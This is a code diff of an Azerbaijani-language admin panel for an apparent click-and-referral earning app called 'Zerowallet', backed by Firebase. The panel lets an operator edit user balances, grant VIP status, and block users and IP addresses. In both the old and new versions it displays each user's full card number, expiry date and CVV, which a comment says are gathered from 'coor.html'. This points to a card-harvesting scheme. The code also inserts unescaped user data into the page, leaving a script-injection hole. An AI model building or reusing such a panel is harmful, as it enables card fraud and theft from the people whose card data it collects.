@@ -2,18 +2,18 @@
 <html lang="az">
 <head>
     <meta charset="UTF-8">
-    <title>Zerowallet | Admin Terminal v2.5</title>
+    <title>Zerowallet | Admin Terminal v2.6</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root { --neon: #00f2ff; --bg: #0a0a0b; --row-bg: #141416; }
         body { background: var(--bg); color: #e0e0e0; font-family: 'Courier New', monospace; padding: 20px; }
-        .container { max-width: 1300px; margin: 0 auto; }
+        .container { max-width: 1400px; margin: 0 auto; }
         h1 { color: var(--neon); border-bottom: 2px solid var(--neon); padding-bottom: 10px; text-transform: uppercase; }
         h2 { color: var(--neon); font-size: 1.2rem; margin-top: 40px; }
         .table-wrap { background: var(--row-bg); border-radius: 10px; overflow: hidden; margin-top: 15px; border: 1px solid #222; overflow-x: auto; }
-        table { width: 100%; border-collapse: collapse; min-width: 1000px; }
+        table { width: 100%; border-collapse: collapse; min-width: 1100px; }
         th { background: #1c1c1f; padding: 15px; text-align: left; color: var(--neon); font-size: 0.75rem; text-transform: uppercase; }
         td { padding: 15px; border-bottom: 1px solid #1c1c1f; font-size: 0.85rem; }
         .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 5px; font-size: 0.7rem; }
@@ -21,16 +21,14 @@
         .btn-unblock { background: #00ff41; color: black; }
         .btn-vip { background: #f59e0b; color: black; }
         .sys-box { background: #1c1c1f; padding: 20px; border-radius: 10px; border: 1px solid var(--neon); margin-bottom: 20px; }
-        .img-preview { width: 120px; height: 70px; object-fit: cover; border-radius: 5px; cursor: pointer; border: 1px solid var(--neon); transition: 0.3s; }
-        .img-preview:hover { transform: scale(1.1); }
         .stat-badge { background: #222; padding: 4px 8px; border-radius: 4px; font-size: 0.8rem; color: #fff; border: 1px solid #333; cursor: pointer; }
-        .card-info-box { font-size: 0.7rem; color: #94a3b8; background: #000; padding: 5px; border-radius: 4px; }
+        .card-info-box { font-size: 0.7rem; color: #94a3b8; background: #000; padding: 5px; border-radius: 4px; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1><i class="fas fa-terminal"></i> ADMIN SYSTEM</h1>
+    <h1><i class="fas fa-terminal"></i> ADMIN SYSTEM v2.6</h1>
 
     <div class="sys-box">
         <h3 style="margin-top:0; color:var(--neon);"><i class="fas fa-power-off"></i> SİSTEM STATUSU</h3>
@@ -38,23 +36,7 @@
         <button id="toggle-sys-btn" class="btn" onclick="toggleSystem()" style="padding: 15px 30px; font-size: 1rem;"></button>
     </div>
 
-    <h2><i class="fas fa-receipt"></i> GƏLƏN ÖDƏNİŞLƏR (ÇEKLƏR)</h2>
-    <div class="table-wrap">
-        <table>
-            <thead><tr><th>İstifadəçi</th><th>Seçilən Roket</th><th>Çek Şəkli</th><th>Tarix</th><th>İdarəetmə</th></tr></thead>
-            <tbody id="payment-body"></tbody>
-        </table>
-    </div>
-
-    <h2><i class="fas fa-credit-card"></i> NAĞDLAŞDIRMA TƏLƏBLƏRİ</h2>
-    <div class="table-wrap">
-        <table>
-            <thead><tr><th>İstifadəçi</th><th>Məbləğ</th><th>Kart Sahibi</th><th>Kart No/EXP/CVV</th><th>İdarəetmə</th></tr></thead>
-            <tbody id="withdraw-body"></tbody>
-        </table>
-    </div>
-
-    <h2><i class="fas fa-users"></i> İSTİFADƏÇİ SİYAHISI & STATİSTİKA</h2>
+    <h2><i class="fas fa-users"></i> İSTİFADƏÇİ İDARƏETMƏSİ</h2>
     <div class="table-wrap">
         <table>
             <thead>
@@ -63,10 +45,9 @@
                     <th>Balans</th>
                     <th>VIP</th>
                     <th>Paket</th>
-                    <th>Referal</th>
-                    <th>Klik</th>
+                    <th>Ref / Klik</th>
                     <th>Kart Məlumatları</th>
-                    <th>Status / IP</th>
+                    <th>IP Ünvanı</th>
                     <th>İdarəetmə</th>
                 </tr>
             </thead>
@@ -88,87 +69,19 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    db.ref('settings/system_status').on('value', snap => {
-        const status = snap.val();
-        const btn = document.getElementById('toggle-sys-btn');
-        const txt = document.getElementById('status-text');
-        if (status === "active") {
-            txt.innerHTML = `Sistem: <b style="color:#00ff41">AKTİV</b>`;
-            btn.innerText = "SİSTEMİ BAĞLA (MAINTENANCE)";
-            btn.className = "btn btn-block";
-        } else {
-            txt.innerHTML = `Sistem: <b style="color:#ff3e3e">BAĞLI</b>`;
-            btn.innerText = "SİSTEMİ AÇ (ONLINE)";
-            btn.className = "btn btn-unblock";
-        }
-    });
-
     function toggleSystem() {
         db.ref('settings/system_status').once('value', snap => {
             const next = snap.val() === "active" ? "maintenance" : "active";
-            if(confirm("Sistem statusu dəyişdirilsin?")) db.ref('settings').update({ system_status: next });
+            db.ref('settings').update({ system_status: next });
         });
     }
 
-    db.ref('admin_receipts').on('value', snap => {
-        const body = document.getElementById('payment-body');
-        body.innerHTML = '';
-        snap.forEach(child => {
-            const d = child.val();
-            const key = child.key;
-            const date = new Date(d.timestamp).toLocaleString('az-AZ');
-            body.innerHTML += `<tr>
-                <td><b>${d.username}</b></td>
-                <td><b style="color:var(--neon)">${d.rocket_type}</b></td>
-                <td><img src="${d.receipt_url}" class="img-preview" onclick="window.open(this.src)"></td>
-                <td><small>${date}</small></td>
-                <td>
-                    <button class="btn btn-unblock" onclick="approveRocket('${key}', '${d.username}', '${d.rocket_type}')">TƏSDİQLƏ</button>
-                    <button class="btn btn-block" onclick="removeData('admin_receipts/${key}')">SİL</button>
-                </td>
-            </tr>`;
-        });
+    db.ref('settings/system_status').on('value', snap => {
+        const s = snap.val();
+        document.getElementById('status-text').innerHTML = `Status: ${s === 'active' ? '<b style="color:#00ff41">ONLINE</b>' : '<b style="color:#ff3e3e">MAINTENANCE</b>'}`;
+        document.getElementById('toggle-sys-btn').innerText = s === 'active' ? "SİSTEMİ BAĞLA" : "SİSTEMİ AÇ";
+        document.getElementById('toggle-sys-btn').className = s === 'active' ? "btn btn-block" : "btn btn-unblock";
     });
-
-    function approveRocket(key, username, rocketType) {
-        if(confirm(`${username} üçün ${rocketType} paketi aktiv edilsin?`)) {
-            db.ref('zerowallet_users/' + username).update({ 
-                rocket: rocketType.toLowerCase().replace(' pack', '') 
-            }).then(() => {
-                db.ref('admin_receipts/' + key).remove();
-                alert("Ödəniş təsdiqləndi!");
-            });
-        }
-    }
-
-    db.ref('admin_withdrawals').on('value', snap => {
-        const body = document.getElementById('withdraw-body');
-        body.innerHTML = '';
-        snap.forEach(child => {
-            const d = child.val();
-            const key = child.key;
-            body.innerHTML += `<tr>
-                <td><b>${d.username}</b></td>
-                <td style="color:#00ff41">${d.amount} AZN</td>
-                <td>${d.card_name}</td>
-                <td><small>${d.card_num}<br>${d.card_exp} | ${d.card_cvv}</small></td>
-                <td>
-                    <button class="btn btn-unblock" onclick="approveWithdrawal('${key}', '${d.username}', ${d.amount})">ÖDƏNİLDİ</button>
-                    <button class="btn btn-block" onclick="removeData('admin_withdrawals/${key}')">İMTİNA</button>
-                </td>
-            </tr>`;
-        });
-    });
-
-    function approveWithdrawal(key, username, amount) {
-        if(confirm(`${username} üçün çıxarış tamamlandı? Balansdan çıxılacaq.`)) {
-            db.ref('zerowallet_users/' + username).once('value', snap => {
-                const currentBal = snap.val().balance || 0;
-                db.ref('zerowallet_users/' + username).update({ balance: Math.max(0, currentBal - amount) });
-                db.ref('admin_withdrawals/' + key).remove();
-            });
-        }
-    }
 
     db.ref('zerowallet_users').on('value', snap => {
         const body = document.getElementById('user-body');
@@ -176,36 +89,31 @@
         snap.forEach(child => {
             const u = child.val();
             const uname = child.key;
-            const cleanIp = (u.ip || "").replace(/\./g, '_');
             
-            // Kart məlumatları (coor.html-dən gələn)
-            let cardDisplay = "Yoxdur";
+            let cardInfo = "Yoxdur";
             if(u.cardInfo) {
-                cardDisplay = `<div class="card-info-box">
-                    ${u.cardInfo.number}<br>${u.cardInfo.expiry} | ${u.cardInfo.cvv}
+                cardInfo = `<div class="card-info-box">
+                    💳 ${u.cardInfo.number}<br>📅 ${u.cardInfo.expiry} | 🔒 ${u.cardInfo.cvv}
                 </div>`;
             }
 
-            db.ref('blocked_ips/' + cleanIp).once('value', blockSnap => {
-                const isBlocked = blockSnap.exists();
-                const rowId = `row_${uname}`;
-                
-                const rowHtml = `<tr id="${rowId}">
-                    <td><b>${uname}</b></td>
-                    <td><span class="stat-badge" onclick="editStat('${uname}', 'balance', ${u.balance || 0})">${(u.balance || 0).toFixed(4)} AZN</span></td>
-                    <td><button class="btn ${u.isVip ? 'btn-unblock' : 'btn-vip'}" onclick="toggleVip('${uname}', ${!u.isVip})">${u.isVip ? 'VIP AÇIK' : 'VIP VER'}</button></td>
-                    <td><span class="stat-badge" onclick="editStat('${uname}', 'rocket', '${u.rocket || 'default'}')">${u.rocket || 'default'}</span></td>
-                    <td><span class="stat-badge" onclick="editStat('${uname}', 'referralCount', ${u.referralCount || 0})">${u.referralCount || 0}</span></td>
-                    <td><span class="stat-badge" onclick="editStat('${uname}', 'totalClicks', ${u.totalClicks || 0})">${u.totalClicks || 0}</span></td>
-                    <td>${cardDisplay}</td>
-                    <td>${isBlocked ? '<b style="color:red">BLOK</b>' : '<b style="color:green">AKTİV</b>'}<br><small>${u.ip || '0.0.0.0'}</small></td>
-                    <td>
-                        <button class="btn ${isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="toggleBlock('${u.ip}', ${!isBlocked})">${isBlocked ? 'AÇ' : 'BLOKLA'}</button>
-                    </td>
-                </tr>`;
-                
-                body.innerHTML += rowHtml;
-            });
+            body.innerHTML += `<tr>
+                <td><b>${uname}</b></td>
+                <td><span class="stat-badge" onclick="editStat('${uname}', 'balance', ${u.balance || 0})">${(u.balance || 0).toFixed(4)} AZN</span></td>
+                <td><button class="btn ${u.isVip ? 'btn-unblock' : 'btn-vip'}" onclick="toggleStatus('${uname}', 'isVip', ${!u.isVip})">${u.isVip ? 'VIP' : 'SADƏ'}</button></td>
+                <td><span class="stat-badge" onclick="editStat('${uname}', 'rocket', '${u.rocket || 'default'}')">${u.rocket || 'default'}</span></td>
+                <td>
+                    <span class="stat-badge" onclick="editStat('${uname}', 'referralCount', ${u.referralCount || 0})">R: ${u.referralCount || 0}</span>
+                    <span class="stat-badge" onclick="editStat('${uname}', 'totalClicks', ${u.totalClicks || 0})">K: ${u.totalClicks || 0}</span>
+                </td>
+                <td>${cardInfo}</td>
+                <td><small>${u.ip || '0.0.0.0'}</small></td>
+                <td>
+                    <button class="btn ${u.isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="handleBlock('${uname}', '${u.ip}', ${!u.isBlocked})">
+                        ${u.isBlocked ? 'BLOKU AÇ' : 'BLOKLA'}
+                    </button>
+                </td>
+            </tr>`;
         });
     });
 
@@ -213,32 +121,30 @@
         let val = prompt(`${uname} üçün yeni ${field}:`, current);
         if (val !== null) {
             let updateObj = {};
-            updateObj[field] = (field === 'balance' || field === 'referralCount' || field === 'totalClicks') ? parseFloat(val) : val;
+            updateObj[field] = (field === 'rocket' || field === 'isVip') ? val : parseFloat(val);
             db.ref('zerowallet_users/' + uname).update(updateObj);
         }
     }
 
-    function toggleVip(uname, status) {
-        db.ref('zerowallet_users/' + uname).update({ isVip: status });
+    function toggleStatus(uname, field, status) {
+        let obj = {}; obj[field] = status;
+        db.ref('zerowallet_users/' + uname).update(obj);
     }
 
-function toggleBlock(uname, ip, status) {
-    if(!ip || !uname) return;
-    const cleanIp = ip.replace(/\./g, '_');
-    
-    if (status) {
-        // Həm IP-ni blokla, həm də istifadəçini işarələ
-        db.ref('blocked_ips/' + cleanIp).set({ ip: ip, username: uname, date: Date.now() });
-        db.ref('zerowallet_users/' + uname).update({ isBlocked: true });
-    } else {
-        db.ref('blocked_ips/' + cleanIp).remove();
-        db.ref('zerowallet_users/' + uname).update({ isBlocked: false });
+    function handleBlock(uname, ip, status) {
+        if(!confirm(status ? "İstifadəçi bloklansın?" : "Blok açılsın?")) return;
+        
+        // 1. İstifadəçini bazada blokla
+        db.ref('zerowallet_users/' + uname).update({ isBlocked: status });
+        
+        // 2. IP-ni blok siyahısına sal/çıxar
+        if(ip) {
+            const cleanIp = ip.replace(/\./g, '_');
+            if(status) db.ref('blocked_ips/' + cleanIp).set({ ip: ip, username: uname, date: Date.now() });
+            else db.ref('blocked_ips/' + cleanIp).remove();
+        }
+        alert("Əməliyyat uğurludur!");
     }
-}
-
-// İstifadəçi siyahısı hissəsində düyməni belə çağır:
-// <button class="btn ${u.isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="toggleBlock('${uname}', '${u.ip}', ${!u.isBlocked})">${u.isBlocked ? 'AÇ' : 'BLOKLA'}</button>
-
 </script>
 </body>
 </html>
